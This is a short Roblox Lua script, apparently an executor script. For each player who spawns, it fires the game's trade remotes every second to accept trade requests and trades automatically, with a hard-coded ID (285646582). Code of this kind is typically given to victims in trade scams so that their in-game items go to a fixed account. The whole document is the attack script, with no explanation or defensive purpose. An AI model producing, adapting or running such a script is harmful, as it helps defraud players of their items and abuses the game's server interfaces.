game.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        task.spawn(function()
            while wait(1) do
                game:GetService("ReplicatedStorage").Trade.AcceptRequest:FireServer()
                
                local args = {
                    [1] = 285646582
                }
                
                game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(args))
            end
        end)
    end)
end)
